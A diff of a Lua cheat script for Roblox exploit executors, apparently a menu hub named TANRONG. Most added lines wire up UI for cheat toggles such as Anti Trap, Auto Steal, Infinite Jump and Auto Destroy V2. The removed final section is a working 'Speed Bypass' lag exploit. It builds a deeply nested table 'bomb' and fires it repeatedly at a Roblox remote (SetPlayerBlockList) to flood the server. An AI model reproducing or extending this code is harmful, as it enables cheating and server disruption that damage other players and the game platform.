+    local basePos = UDim2.new(0, TAB_W + 8, 0, 48)
+    for n, p in pairs(pages) do
+        p.ZIndex = 3
+        if n == name then
+            p.Visible = true
+            if activeTabName ~= name then
+                p.Position = UDim2.new(0, TAB_W + 18, 0, 48)
+                TS:Create(p, TweenInfo.new(0.20, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+                    Position = basePos,
+                }):Play()
+            end
+        else
+            p.Visible = false
+            p.Position = basePos
+        end
+    end
+    for n, b in pairs(tabBtns) do
+        local on = n == name
+        TS:Create(b, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            BackgroundColor3 = on and C.accent or C.card,
+            TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text,
+        }):Play()
+    end
+    activeTabName = name
 end
 function addTab(name, order)
 	local b = Instance.new("TextButton")
@@ -4476,6 +5942,20 @@ function addTab(name, order)
 	b.Parent = TabBar
 	corner(b, 8)
 	local function go() setTab(name) end
+    b.MouseEnter:Connect(function()
+        if activeTabName ~= name then
+            TS:Create(b, TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                BackgroundColor3 = C.bg2,
+            }):Play()
+        end
+    end)
+    b.MouseLeave:Connect(function()
+        if activeTabName ~= name then
+            TS:Create(b, TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                BackgroundColor3 = C.card,
+            }):Play()
+        end
+    end)
 	b.MouseButton1Click:Connect(go)
 	b.Activated:Connect(go)
 	tabBtns[name] = b
@@ -4705,6 +6185,7 @@ end
 ----------------------------------------------------------------
 section(pagePlayer, "* — ANTI", 1)
 toggleNamed(pagePlayer, "Anti Gummy Bear", St.antiGummy, setAntiGummy, 2, "antiGummy")
+toggleNamed(pagePlayer, "Anti Bee", St.antiBee == true, setAntiBee, 2.5, "antiBee")
 toggleNamed(pagePlayer, "Anti Ragdoll", St.antiRagdoll, setAntiRagdoll, 3, "antiRagdoll")
 do
 	local r = row(pagePlayer, 36, 3.5)
@@ -4781,6 +6262,124 @@ t2.TextTransparency = isV2 and 0 or 0.35
 end
 toggleNamed(pagePlayer, "Anti Paintball Gun", St.antiPaint, setAntiPaint, 4, "antiPaint")
 toggleNamed(pagePlayer, "Anti Boogie Bomb", St.antiBoogie, setAntiBoogie, 5, "antiBoogie")
+toggleNamed(pagePlayer, "Anti Trap", St.antiTrap, setAntiTrap, 6, "antiTrap")
+
+do
+    local gearRow = row(pagePlayer, 72, 7)
+    gearRow.Name = "AntiTrapGearSelector"
+
+    local title = Instance.new("TextLabel")
+    title.Name = "GearTitle"
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1, -16, 0, 18)
+    title.Position = UDim2.fromOffset(10, 3)
+    title.Text = "ANTI TRAP GEAR"
+    title.TextColor3 = C.textDim
+    title.TextSize = 10
+    title.Font = Enum.Font.GothamBlack
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Parent = gearRow
+
+    local gearNames = {
+        "Cupid's Wings",
+        "Santa's Sleigh",
+        "Witch's Broom",
+        "Flying Carpet",
+        "Waverider",
+    }
+    local gearButtons = {}
+
+    local function refreshAntiTrapGearSelector()
+        for _, gearName in ipairs(gearNames) do
+            local b = gearButtons[gearName]
+            if b then
+                local selected = St.antiTrapGear == gearName
+                local available = false
+                if type(_G.RanaVSHasAntiTrapGear) == "function" then
+                    local ok, result = pcall(_G.RanaVSHasAntiTrapGear, gearName)
+                    available = ok and result == true
+                end
+                TS:Create(b, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                    BackgroundColor3 = selected and C.accent or C.box,
+                    TextColor3 = selected and Color3.fromRGB(255,255,255) or C.textDim,
+                }):Play()
+                b.TextTransparency = available and 0 or 0.30
+                b.Font = selected and Enum.Font.GothamBlack or Enum.Font.GothamMedium
+                b:SetAttribute("OwnedInInventory", available)
+                b:SetAttribute("SelectedGear", selected)
+                local st = b:FindFirstChildOfClass("UIStroke")
+                if st then
+                    st.Color = selected and C.accent or C.stroke
+                    st.Thickness = selected and 1.6 or 1
+                    st.Transparency = selected and 0.05 or 0.28
+                end
+            end
+        end
+    end
+
+    for i, gearName in ipairs(gearNames) do
+        local b = Instance.new("TextButton")
+        b.Name = "Gear_" .. tostring(i)
+        b.Size = UDim2.new(0.2, -6, 0, 39)
+        b.Position = UDim2.new((i - 1) * 0.2, 4, 0, 27)
+        b.BackgroundColor3 = C.box
+        b.BorderSizePixel = 0
+        b.Text = gearName
+        b.TextColor3 = C.textDim
+        b.TextSize = 8
+        b.TextWrapped = true
+        b.Font = Enum.Font.GothamMedium
+        b.AutoButtonColor = false
+        b.ZIndex = 20
+        b.Parent = gearRow
+        corner(b, 7)
+        local st = Instance.new("UIStroke")
+        st.Color = C.stroke
+        st.Thickness = 1
+        st.Transparency = 0.28
+        st.Parent = b
+        gearButtons[gearName] = b
+        b.Activated:Connect(function()
+            if type(setAntiTrapGear) == "function" then
+                pcall(setAntiTrapGear, gearName)
+            else
+                St.antiTrapGear = gearName
+                pcall(saveCfg)
+            end
+            refreshAntiTrapGearSelector()
+        end)
+    end
+
+    _G.RanaVSRefreshAntiTrapGearUI = refreshAntiTrapGearSelector
+    _G.TANRONGRefreshAntiTrapGearUI = refreshAntiTrapGearSelector
+    refreshAntiTrapGearSelector()
+
+    -- Refresh the available/selected state when tools enter or leave inventory.
+    if type(_G.TANRONGAntiTrapGearConnections) == "table" then
+        for _, conn in ipairs(_G.TANRONGAntiTrapGearConnections) do
+            pcall(function() conn:Disconnect() end)
+        end
+    end
+    local gearConnections = {}
+    _G.TANRONGAntiTrapGearConnections = gearConnections
+    local function bindGearInventory(container)
+        if not container then return end
+        table.insert(gearConnections, container.ChildAdded:Connect(function()
+            task.delay(0.12, refreshAntiTrapGearSelector)
+        end))
+        table.insert(gearConnections, container.ChildRemoved:Connect(function()
+            task.delay(0.12, refreshAntiTrapGearSelector)
+        end))
+    end
+    bindGearInventory(LP:FindFirstChildOfClass("Backpack"))
+    bindGearInventory(LP.Character)
+    table.insert(gearConnections, LP.CharacterAdded:Connect(function(char)
+        task.delay(0.25, function()
+            bindGearInventory(char)
+            refreshAntiTrapGearSelector()
+        end)
+    end))
+end
 
 section(pagePlayer, "* — SPEED (Tanrong S2)", 10)
 toggleNamed(pagePlayer, "Speed On", St.speedOn, setSpeedOn, 11, "speedOn")
@@ -4898,7 +6497,7 @@ end
 -- Ragdoll TP Left/Right removed from menu
 
 toggleNamed(pagePlayer, "Infinite Jump (Hold)", St.infJump, setInfJump, 215, "infJump")
-toggleNamed(pagePlayer, "Auto Destroy Sentry", St.destroySentry, setDestroySentry, 216, "destroySentry")
+toggleNamed(pagePlayer, "Auto Destroy V2", St.destroySentry, setDestroySentry, 216, "destroySentry")
 -- drop mode
 local dropRow = row(pagePlayer, 38, 22)
 local dropLbl = Instance.new("TextLabel")
@@ -5001,7 +6600,7 @@ end
 keyRow("Key Drop", "Drop", 31)
 keyRow("Key TP Down", "TPDown", 32)
 keyRow("Key Insta Reset", "InstaReset", 33)
-keyRow("Key Destroy Sentry", "DestroySentry", 34)
+keyRow("Key Auto Destroy V2", "DestroySentry", 34)
 keyRow("Key Auto Steal", "AutoSteal", 35)
 
 -- Full KEYBINDS TAB
@@ -5080,7 +6679,7 @@ b.Activated:Connect(startListen)
 	keyRowTab("Drop", "Drop", 3)
 	keyRowTab("TP Down", "TPDown", 4)
 	keyRowTab("Insta Reset", "InstaReset", 5)
-	keyRowTab("Destroy Sentry", "DestroySentry", 6)
+	keyRowTab("Auto Destroy V2", "DestroySentry", 6)
 	keyRowTab("Auto Steal (toggle)", "AutoSteal", 7)
 	local hint = Instance.new("TextLabel")
 	hint.Size = UDim2.new(1, -16, 0, 40)
@@ -5168,99 +6767,6 @@ toggleNamed(pageSet, "Show Panel TP", St.showTPPanel ~= false, function(on)
 	if g then g.Enabled = St.showTPPanel end
 	saveCfg()
 end, 25, "showTPPanel")
-toggleNamed(pageSet, "Show Panel Lagger", St.showLaggerPanel == true, function(on)
-	if _G.TANRONGSetLaggerPanel then _G.TANRONGSetLaggerPanel(on) else St.showLaggerPanel = on; saveCfg() end
-end, 25.1, "showLaggerPanel")
-toggleNamed(pageSet, "Show Panel Speed Bypass", St.showSpeedBypassPanel == true, function(on)
-	if _G.TANRONGSetSpeedBypassPanel then _G.TANRONGSetSpeedBypassPanel(on) else St.showSpeedBypassPanel = on; saveCfg() end
-end, 25.3, "showSpeedBypassPanel")
--- Panel GUI size (to/nhỏ + rộng) dưới các panel
-do
-	local r = row(pageSet, 38, 25.4)
-	local t = Instance.new("TextLabel")
-	t.Size = UDim2.new(0.45, 0, 1, 0)
-	t.Position = UDim2.new(0, 12, 0, 0)
-	t.BackgroundTransparency = 1
-	t.Text = "Panels Scale %"
-	t.TextColor3 = C.text
-	t.TextSize = 12
-	t.Font = Enum.Font.Gotham
-	t.TextXAlignment = Enum.TextXAlignment.Left
-	t.Parent = r
-	local val = Instance.new("TextLabel")
-	val.Size = UDim2.new(0, 44, 0, 24)
-	val.Position = UDim2.new(1, -120, 0.5, -12)
-	val.BackgroundTransparency = 1
-	val.Text = tostring(math.floor((St.panelGuiScale or 0.7) * 100)) .. "%"
-	val.TextColor3 = C.text
-	val.TextSize = 12
-	val.Font = Enum.Font.GothamBold
-	val.Parent = r
-	for _, info in ipairs({{"-", -80}, {"+", -44}}) do
-local b = Instance.new("TextButton")
-b.Size = UDim2.new(0, 28, 0, 28)
-b.Position = UDim2.new(1, info[2], 0.5, -14)
-b.BackgroundColor3 = C.box
-b.Text = info[1]
-b.TextColor3 = C.text
-b.TextSize = 16
-b.Font = Enum.Font.GothamBold
-b.AutoButtonColor = false
-b.Parent = r
-corner(b, 7)
-local function fire()
-St.panelGuiScale = math.clamp((tonumber(St.panelGuiScale) or 1) + (info[1] == "+" and 0.05 or -0.05), 0.6, 1.6)
-val.Text = tostring(math.floor(St.panelGuiScale * 100)) .. "%"
-if _G.TANRONGApplyPanelGuiScale then pcall(_G.TANRONGApplyPanelGuiScale) end
-saveCfg()
-end
-b.MouseButton1Click:Connect(fire)
-b.Activated:Connect(fire)
-	end
-end
-do
-	local r = row(pageSet, 38, 25.45)
-	local t = Instance.new("TextLabel")
-	t.Size = UDim2.new(0.45, 0, 1, 0)
-	t.Position = UDim2.new(0, 12, 0, 0)
-	t.BackgroundTransparency = 1
-	t.Text = "Panels Width %"
-	t.TextColor3 = C.text
-	t.TextSize = 12
-	t.Font = Enum.Font.Gotham
-	t.TextXAlignment = Enum.TextXAlignment.Left
-	t.Parent = r
-	local val = Instance.new("TextLabel")
-	val.Size = UDim2.new(0, 44, 0, 24)
-	val.Position = UDim2.new(1, -120, 0.5, -12)
-	val.BackgroundTransparency = 1
-	val.Text = tostring(math.floor((St.panelGuiWidth or 1) * 100)) .. "%"
-	val.TextColor3 = C.text
-	val.TextSize = 12
-	val.Font = Enum.Font.GothamBold
-	val.Parent = r
-	for _, info in ipairs({{"-", -80}, {"+", -44}}) do
-local b = Instance.new("TextButton")
-b.Size = UDim2.new(0, 28, 0, 28)
-b.Position = UDim2.new(1, info[2], 0.5, -14)
-b.BackgroundColor3 = C.box
-b.Text = info[1]
-b.TextColor3 = C.text
-b.TextSize = 16
-b.Font = Enum.Font.GothamBold
-b.AutoButtonColor = false
-b.Parent = r
-corner(b, 7)
-local function fire()
-St.panelGuiWidth = math.clamp((tonumber(St.panelGuiWidth) or 1) + (info[1] == "+" and 0.05 or -0.05), 0.7, 1.5)
-val.Text = tostring(math.floor(St.panelGuiWidth * 100)) .. "%"
-if _G.TANRONGApplyPanelGuiScale then pcall(_G.TANRONGApplyPanelGuiScale) end
-saveCfg()
-end
-b.MouseButton1Click:Connect(fire)
-b.Activated:Connect(fire)
-	end
-end
 toggleNamed(pageSet, "Lock UI", St.guiLock, function(on)
 	St.guiLock = on and true or false
 	-- snapshot positions then save immediately on lock/unlock
@@ -5463,8 +6969,9 @@ sizeRow("Size: Speed 3Mode", "mode", 22.5)
 sizeRow("Size: Drop", "drop", 23)
 sizeRow("Size: Insta", "insta", 24)
 sizeRow("Size: TP", "tp", 25)
-sizeRow("Size: Sentry", "sentry", 25.5)
+sizeRow("Size: Auto Destroy V2", "sentry", 25.5)
 sizeRow("Size: Auto Steal", "steal", 26)
+sizeRow("Size: Anti Trap", "antiTrap", 26.5)
 
 
 section(pageSet, "* — MENU UI SCALE", 28)
@@ -5526,6 +7033,7 @@ actionBtn(pageSet, "Reset All Settings", C.danger, function()
 	pcall(function() setToolAim(true) end)
 	pcall(function() setInfJump(true) end)
 	pcall(function() setDestroySentry(false) end)
+	pcall(function() setAntiTrap(false) end)
 	pcall(function() setSpeedOn(true) end)
 	pcall(function() setActiveMode("Normal") end)
 	St.dropMode = 2
@@ -5536,7 +7044,7 @@ actionBtn(pageSet, "Reset All Settings", C.danger, function()
 	St.btnShape = "Square"
 	St.btnScale = 0.75
 	St.menuScale = 1
-	St.btnSizes = { mode = 50, drop = 50, insta = 50, tp = 50, sentry = 50, steal = 50 }
+	St.btnSizes = { mode = 50, drop = 50, insta = 50, tp = 50, sentry = 50, steal = 50, antiTrap = 50 }
 	St._btnPos = nil
 	St._modeBarPos = nil
 	St._miniPos = nil
@@ -5571,7 +7079,7 @@ pcall(function() setAutoSteal(false) end)
 	end
 	-- sync toggle UI
 	local defs = {
-antiGummy = true, antiRagdoll = false, antiPaint = true, antiBoogie = true,
+antiGummy = true, antiRagdoll = false, antiPaint = true, antiBoogie = true, antiTrap = false,
 toolAim = true, infJump = true, destroySentry = false, speedOn = true,
 mobileBtns = true, guiLock = false,
 esp = false, tracer = false, antiLag = false,
@@ -5710,22 +7218,36 @@ openMenu()
 end
 
 function openMenu()
+    local targetScale = math.clamp(tonumber(St.menuScale) or 1, 0.5, 1.5)
 	Main.Visible = true
 	Mini.Visible = false
 	St.menuOpen = true
 	pcall(saveCfg)
 	Main.Size = UDim2.new(0, 0, 0, MH)
-	TS:Create(Main, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    if menuScaleObj then menuScaleObj.Scale = targetScale * 0.92 end
+	TS:Create(Main, TweenInfo.new(0.24, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
 Size = UDim2.new(0, MW, 0, MH),
 	}):Play()
+    if menuScaleObj then
+        TS:Create(menuScaleObj, TweenInfo.new(0.26, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Scale = targetScale,
+        }):Play()
+    end
 end
 function closeMenu()
-	local tw = TS:Create(Main, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+    local targetScale = math.clamp(tonumber(St.menuScale) or 1, 0.5, 1.5)
+	local tw = TS:Create(Main, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
 Size = UDim2.new(0, 0, 0, MH),
 	})
+    if menuScaleObj then
+        TS:Create(menuScaleObj, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Scale = targetScale * 0.92,
+        }):Play()
+    end
 	tw:Play()
 	tw.Completed:Connect(function()
 Main.Visible = false
+if menuScaleObj then menuScaleObj.Scale = targetScale end
 St.menuOpen = false
 pcall(function()
 if Main and Main.Parent then
@@ -5778,7 +7300,7 @@ ActGui.Parent = PlayerGui
 local modeRefs = {}
 local actRefs = {}
 
--- Shape chỉ áp dụng cho ACTION buttons (Drop/Insta/TP/Sentry/Steal).
+-- Shape chỉ áp dụng cho ACTION buttons (Drop/Insta/TP/Auto Destroy V2/Steal).
 -- 3-mode speed (Normal/Lagger/Custom) LUÔN giữ style mặc định (Pill) như video.
 function applyCorner(btn, forceShape)
 	if not btn then return end
@@ -6201,7 +7723,7 @@ end
 
 
 function makeActBtn(key, label, pos, cb)
-	-- Mobile button: dễ bấm — steal/sentry/drop/insta/tp cùng độ nhạy
+	-- Mobile button: dễ bấm — steal/auto-destroy/drop/insta/tp cùng độ nhạy
 	local baseSz = (St.btnSizes[key] or 50)
 	if key == "steal" or key == "sentry" then
 baseSz = math.max(baseSz, 56)
@@ -6242,7 +7764,7 @@ s.Transparency = 0.15
 s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 s.Parent = btn
 	end
-	applyEmpireBtnBg(btn, ({drop=1,insta=2,tp=3,sentry=4,steal=5})[key] or 5)
+	applyEmpireBtnBg(btn, ({drop=1,insta=2,tp=3,sentry=4,steal=5,antiTrap=6})[key] or 5)
 	applyCornerToChildren(btn, St.btnShape)
 	local bgImg = btn:FindFirstChild("BtnBgImage")
 	if bgImg then
@@ -6301,7 +7823,7 @@ if not dragging then return end
 dragging = false
 local tapLimit = TAP_MAX
 -- steal/sentry/drop/insta/tp: dễ bấm hơn
-if key == "steal" or key == "sentry" or key == "drop" or key == "insta" or key == "tp" then
+if key == "steal" or key == "sentry" or key == "drop" or key == "insta" or key == "tp" or key == "antiTrap" then
 tapLimit = 48
 end
 if movedDistance < tapLimit then
@@ -6336,8 +7858,8 @@ if key == "steal" and _G.TANRONGRefreshStealBtn then pcall(_G.TANRONGRefreshStea
 	local ov = btn:FindFirstChild("BtnTextOverlay")
 	if ov then ov.Active = false; ov.Selectable = false end
 
-	-- STEAL / SENTRY: phản hồi ngay + màu xanh đậm
-	if key == "steal" or key == "sentry" then
+	-- AUTO STEAL / AUTO DESTROY V2: phản hồi ngay + màu xanh đậm
+	if key == "steal" or key == "sentry" or key == "antiTrap" then
 local function instantToggle()
 local last = btn:GetAttribute("_lastTap") or 0
 if tick() - last < 0.12 then return end
@@ -6354,12 +7876,24 @@ elseif (not on) and type(stopAutoSteal)=="function" then pcall(stopAutoSteal) en
 end
 applyActBtnState(btn, St.autoSteal == true, "STEAL\nON", "AUTO\nSTEAL")
 if _G.TANRONGRefreshStealBtn then pcall(_G.TANRONGRefreshStealBtn) end
-else
+elseif key == "sentry" then
 local on = not (St.destroySentry == true)
 if type(setDestroySentry) == "function" then pcall(setDestroySentry, on)
 else St.destroySentry = on end
-applyActBtnState(btn, St.destroySentry == true, "SENTRY\nON", "SENTRY")
+applyActBtnState(btn, St.destroySentry == true, "DESTROY V2\nON", "DESTROY\nV2")
 if _G.TANRONGRefreshSentryBtn then pcall(_G.TANRONGRefreshSentryBtn) end
+else
+local on = not (St.antiTrap == true)
+if type(setAntiTrap) == "function" then
+    pcall(setAntiTrap, on)
+else
+    St.antiTrap = on
+    St.antiTrapZeroM = on
+    pcall(saveCfg)
+end
+applyActBtnState(btn, St.antiTrap == true, "ANTI TRAP\nON", "ANTI\nTRAP")
+if _G.TANRONGRefreshAntiTrapBtn then pcall(_G.TANRONGRefreshAntiTrapBtn) end
+            if _G.TANRONGRefreshAntiTrapGearUI then pcall(_G.TANRONGRefreshAntiTrapGearUI) end
 end
 end
 btn.MouseButton1Down:Connect(instantToggle)
@@ -6422,7 +7956,7 @@ end
 	makeActBtn("drop", "DROP", UDim2.new(1, -150, 0.5, -40), function() runDrop() if _G.TANRONGCounterOnDrop then pcall(_G.TANRONGCounterOnDrop) end end)
 	makeActBtn("insta", "INSTA\nRESET", UDim2.new(1, -80, 0.5, -40), doInstaReset)
 	makeActBtn("tp", "TP\nDOWN", UDim2.new(1, -80, 0.5, 30), function() doTPDown(true) end)
-	makeActBtn("sentry", "SENTRY", UDim2.new(1, -150, 0.5, 30), function()
+	makeActBtn("sentry", "DESTROY\nV2", UDim2.new(1, -150, 0.5, 30), function()
 local on = not (St.destroySentry == true)
 if type(setDestroySentry) == "function" then
 setDestroySentry(on)
@@ -6447,6 +7981,11 @@ if ToggleRefs and ToggleRefs.autoSteal and ToggleRefs.autoSteal.setVisual then
 pcall(ToggleRefs.autoSteal.setVisual, St.autoSteal == true)
 end
 	end)
+	makeActBtn("antiTrap", "ANTI\nTRAP", UDim2.new(1, -80, 0.5, 100), function()
+        local on = not (St.antiTrap == true)
+        if type(setAntiTrap) == "function" then pcall(setAntiTrap, on) end
+        if _G.TANRONGRefreshAntiTrapBtn then pcall(_G.TANRONGRefreshAntiTrapBtn) end
+    end)
 	-- restore saved positions
 	for key, e in pairs(actRefs) do
 if e.holder then restorePos(e.holder, "A_" .. key) end
@@ -6457,6 +7996,7 @@ if e.holder then restorePos(e.holder, "M_" .. key) end
 	_G.TANRONGRefreshModeBar()
 	_G.TANRONGRefreshSentryBtn()
 	if _G.TANRONGRefreshStealBtn then pcall(_G.TANRONGRefreshStealBtn) end
+    if _G.TANRONGRefreshAntiTrapBtn then pcall(_G.TANRONGRefreshAntiTrapBtn) end
 end
 
 
@@ -6535,10 +8075,16 @@ end
 function _G.TANRONGRefreshSentryBtn()
 	local e = actRefs and actRefs.sentry
 	if e and e.btn then
-applyActBtnState(e.btn, St.destroySentry == true, "SENTRY\nON", "SENTRY")
+applyActBtnState(e.btn, St.destroySentry == true, "DESTROY V2\nON", "DESTROY\nV2")
 	end
 end
 
+function _G.TANRONGRefreshAntiTrapBtn()
+    local e = actRefs and actRefs.antiTrap
+    if e and e.btn then
+        applyActBtnState(e.btn, St.antiTrap == true, "ANTI TRAP\nON", "ANTI\nTRAP")
+    end
+end
 
 function _G.TANRONGRefreshModeBar()
 	for n, e in pairs(modeRefs) do
@@ -6726,6 +8272,8 @@ else
 if stopInfJump then stopInfJump() end
 end
 	end)
+	-- Anti Bee
+	pcall(function() if type(setAntiBee) == "function" then setAntiBee(St.antiBee == true) end end)
 	-- Anti ragdoll
 	pcall(function()
 if St.antiRagdoll then
@@ -6734,6 +8282,10 @@ if startAntiRagdoll then startAntiRagdoll() end
 else
 if stopAntiRagdoll then stopAntiRagdoll() end
 end
+	end)
+	-- Anti Trap
+	pcall(function()
+if setAntiTrap then setAntiTrap(St.antiTrap == true) end
 	end)
 	-- Anti FX flags
 	pcall(function()
@@ -6802,9 +8354,11 @@ _G.TANRONGReapplyAllLogic = reapplyAllLogic
 
 -- Re-apply ALL saved states so toggles that show ON actually work
 pcall(function() setAntiGummy(St.antiGummy ~= false) end)
+pcall(function() setAntiBee(St.antiBee == true) end)
 pcall(function() setAntiBoogie(St.antiBoogie ~= false) end)
 pcall(function() setAntiPaint(St.antiPaint ~= false) end)
 pcall(function() setAntiRagdoll(St.antiRagdoll == true) end)
+pcall(function() setAntiTrap(St.antiTrap == true) end)
 pcall(function() setToolAim(St.toolAim ~= false) end)
 pcall(function() setInfJump(St.infJump ~= false) end)
 pcall(function() setDestroySentry(St.destroySentry == true) end)
@@ -8355,12 +9909,12 @@ end)
 
 task.defer(function()
 	if not pageSet then return end
-	section(pageSet, "* — SENTRY BUTTON SIZE", 28)
+	section(pageSet, "* — AUTO DESTROY V2 BUTTON SIZE", 28)
 	local sr = row(pageSet, 36, 29)
 	local lbl = Instance.new("TextLabel")
 	lbl.Size = UDim2.new(0.5, 0, 1, 0)
 	lbl.BackgroundTransparency = 1
-	lbl.Text = "Sentry size"
+	lbl.Text = "Auto Destroy V2 size"
 	lbl.TextColor3 = C.text
 	lbl.Font = Enum.Font.Gotham
 	lbl.TextSize = 12
@@ -9254,2015 +10808,9 @@ end,
 ----------------------------------------------------------------
 -- 
 ----------------------------------------------------------------
--- TANRONG SPEED BYPASS (full) — mini = ON/OFF EN + Lock | scale panels
-----------------------------------------------------------------
--- ===== TANRONG FULL: Speed Bypass + Lagger V2 (replace All Gear old panels) =====
--- TANRONGBypass — Speed Bypass (Noxa-style UI + keybind PC + minimize + bg)
--- ============================================================
-task.spawn(function()
-	local Players = game:GetService("Players")
-	local LP = Players.LocalPlayer
-	local UserInputService = game:GetService("UserInputService")
-	local UIS = UserInputService
-	local DEPTH = 296
-	local SPAM_DELAY = 0.12
-	local running = false
-	local bomb = nil
-	local spamThread = nil
-	local ConfigFile = "TANRONGBypass.json"
-	-- Dùng full list BackgroundIDs của (1–50+)
-	local BG_IDS = (BackgroundIDs and #BackgroundIDs > 0) and BackgroundIDs or {
-"89504528485163", "108697485255882", "71211662493854", "118953269416540", "106345334781345",
-	}
-
-	local function buildBomb(power)
-local maintable = {}
-local spammedtable = {{}}
-local z = spammedtable[1]
-for i = 1, DEPTH do
-local tableins = {}
-table.insert(z, tableins)
-z = tableins
-end
-local maxRep = math.floor((tonumber(power) or 97000) / (DEPTH + 2))
-maxRep = math.clamp(maxRep, 1, 50000)
-for i = 1, maxRep do
-table.insert(maintable, spammedtable)
-end
-return maintable
-	end
-
-	local function stopBypass()
-running = false
-if spamThread then pcall(function() task.cancel(spamThread) end) end
-bomb = nil
-spamThread = nil
-	end
-
-	local function startBypass(power)
-stopBypass()
-running = true
-bomb = buildBomb(power)
-spamThread = task.spawn(function()
-while running do
-if bomb then
-pcall(function()
-game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(bomb)
-end)
-end
-task.wait(SPAM_DELAY)
-end
-end)
-	end
-
-	_G.AceSetTanrongBypassEnabled = function(on, power)
-if on then startBypass(power or 97000) else stopBypass() end
-	end
-	_G.AceToggleTanrongBypass = function(power)
-if running then stopBypass() else startBypass(power or 97000) end
-return running
-	end
-	_G.AceTanrongBypassActive = function() return running end
-
-	local savedPos = nil
-	local savedBgIndex = 1
-	local boundKey = Enum.KeyCode.V
-	local waitingForKey = false
-	local savedPanelOpen = false
-	local savedMinimized = false
-	local savedWantedActive = false
-	pcall(function()
-if isfile and isfile(ConfigFile) then
-local data = game:GetService("HttpService"):JSONDecode(readfile(ConfigFile))
-if type(data.Pos) == "table" then savedPos = data.Pos end
-if data.Power then _G.AceTanrongBypassPower = tonumber(data.Power) or 97000 end
-if data.BgIndex then savedBgIndex = math.clamp(tonumber(data.BgIndex) or 1, 1, #BG_IDS) end
-if type(data.Keybind) == "string" and Enum.KeyCode[data.Keybind] then
-boundKey = Enum.KeyCode[data.Keybind]
-end
--- Nhớ panel mở / minimize / bypass đang ON trước khi out
-savedPanelOpen = data.PanelOpen == true
-savedMinimized = data.Minimized == true
-savedWantedActive = data.WantedActive == true
-_G.AceTanrongBypassPanelOpen = savedPanelOpen
-end
-	end)
-
-	-- State snapshot (khai báo sớm để saveCfg luôn đọc được)
-	local uiMinimized = false
-	local uiWantedActive = false
-	local uiActive = false
-
-	local function saveCfg(mainFrame, power, extra)
-local panelIsOpen = (_G.AceTanrongBypassPanelOpen == true)
-pcall(function()
-if main and main.Visible then panelIsOpen = true end
-if mini and mini.Visible then panelIsOpen = true end
-end)
-local data = {
-Power = tonumber(power) or 97000,
-BgIndex = savedBgIndex,
-Keybind = boundKey and boundKey.Name or "V",
-PanelOpen = panelIsOpen,
-Minimized = uiMinimized == true,
-WantedActive = uiWantedActive == true or uiActive == true,
-}
-if type(extra) == "table" then
-for k, v in pairs(extra) do data[k] = v end
-end
-if mainFrame and mainFrame.Parent then
-local p = mainFrame.Position
-data.Pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
-savedPos = data.Pos
-_G.AceTanrongBypassPanelPosition = data.Pos
-elseif type(_G.AceTanrongBypassPanelPosition) == "table" then
-data.Pos = _G.AceTanrongBypassPanelPosition
-elseif type(savedPos) == "table" then
-data.Pos = savedPos
-end
-savedPanelOpen = data.PanelOpen == true
-savedMinimized = data.Minimized == true
-savedWantedActive = data.WantedActive == true
-_G.AceTanrongBypassPanelOpen = savedPanelOpen
-_G.AceTanrongBypassMinimized = savedMinimized
-_G.AceTanrongBypassWantedActive = savedWantedActive
-_G.AceTanrongBypassPower = data.Power
-_G.AceSBPEnabled = savedWantedActive
-pcall(function()
-writefile(ConfigFile, game:GetService("HttpService"):JSONEncode(data))
-end)
-pcall(function() if saveAceConfig then saveAceConfig() end end)
-	end
-
-	local parent = (gethui and gethui()) or game:GetService("CoreGui")
-	pcall(function()
-local old = parent:FindFirstChild("TANRONGBypassGui")
-if old then old:Destroy() end
-	end)
-
-	local gui = Instance.new("ScreenGui")
-	gui.Name = "TANRONGBypassGui"
-	gui.ResetOnSpawn = false
-	gui.IgnoreGuiInset = true
-	gui.Enabled = true
-	gui.DisplayOrder = 250
-	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	pcall(function() gui.Parent = parent end)
-	if not gui.Parent then
-local pg = (Players.LocalPlayer or game:GetService("Players").LocalPlayer):WaitForChild("PlayerGui")
-gui.Parent = pg
-	end
-
-	local function corner(obj, r)
-local c = Instance.new("UICorner")
-c.CornerRadius = UDim.new(0, r or 8)
-c.Parent = obj
-return c
-	end
-	local function stroke(obj, col, th, tr)
-local s = Instance.new("UIStroke")
-s.Color = col or Color3.fromRGB(220, 30, 40)
-s.Thickness = th or 1
-s.Transparency = tr or 0.3
-s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-s.Parent = obj
-return s
-	end
-
-	-- ===== FULL PANEL =====
-	local W, H = 230, 320
-	local main = Instance.new("Frame")
-	main.Name = "MainFrame"
-	main.Size = UDim2.fromOffset(W, H)
-	if type(savedPos) == "table" then
-main.Position = UDim2.new(tonumber(savedPos.xs) or 0.5, tonumber(savedPos.xo) or -115, tonumber(savedPos.ys) or 0.35, tonumber(savedPos.yo) or 0)
-	else
-main.Position = UDim2.new(0.5, -115, 0.35, 0)
-	end
-	main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	main.BorderSizePixel = 0
-	main.Active = true
-	main.Visible = false
-	main.ClipsDescendants = true
-	main.Parent = gui
-	corner(main, 13)
-	stroke(main, Color3.fromRGB(39, 39, 39), 1.3)
-
-	-- Background image (Noxa-style)
-	local bgImg = Instance.new("ImageLabel", main)
-	bgImg.Name = "BgImage"
-	bgImg.Size = UDim2.new(1, 0, 1, 0)
-	bgImg.BackgroundTransparency = 1
-	bgImg.Image = "rbxassetid://" .. (BG_IDS[savedBgIndex] or BG_IDS[1])
